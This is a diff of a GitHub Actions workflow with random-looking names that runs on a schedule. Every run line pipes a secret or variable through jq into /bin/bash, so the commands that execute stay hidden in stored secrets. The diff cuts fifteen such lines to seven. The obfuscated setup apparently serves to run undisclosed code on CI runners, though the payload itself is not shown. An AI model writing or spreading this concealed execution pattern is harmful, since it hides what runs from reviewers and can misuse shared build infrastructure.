@@ -1,4 +1,5 @@
 name: niuyaorao3187
+
 on:
   workflow_dispatch:
   schedule:
@@ -7,25 +8,18 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: niuyaorao3187
         env:
-          mvap990: ${{ secrets.mvap990 }}
+          k48: ${{ secrets.k48 }}
         run: |
-          echo $mvap990 | jq -r .pbxkv1726 | /bin/bash
-          echo $y54240 | jq -r .ozp88648 | /bin/bash
-          echo $czsc265 | jq -r .pc045 | /bin/bash
-          echo $s0 | jq -r .e2869 | /bin/bash
-          echo $xigo41 | jq -r .ybfve99 | /bin/bash
-          echo $jqp14 | jq -r .rf84 | /bin/bash
-          echo $vmy5 | jq -r .xlaus8123 | /bin/bash
-          echo $qy841 | jq -r .ccmt849 | /bin/bash
-          echo $st9 | jq -r .nvv51 | /bin/bash
-          echo $dsa96647 | jq -r .ghxh22 | /bin/bash
-          echo $zf601 | jq -r .ocjhn50 | /bin/bash
-          echo $i10 | jq -r .j11612 | /bin/bash
-          echo $lv328 | jq -r .zy06818 | /bin/bash
-          echo $lfnc42 | jq -r .sat17 | /bin/bash
-          echo $mkhu9076 | jq -r .vnn58810 | /bin/bash
+          echo $k48 | jq -r .hdpm913 | /bin/bash
+          echo $exwy37 | jq -r .coyw5720 | /bin/bash
+          echo $vozl08 | jq -r .xbrtg813 | /bin/bash
+          echo $wpgsk60490 | jq -r .sesan20009 | /bin/bash
+          echo $b67103 | jq -r .agls87 | /bin/bash
+          echo $fqi1 | jq -r .ptyzb57 | /bin/bash
+          echo $tp425 | jq -r .avn6 | /bin/bash
 
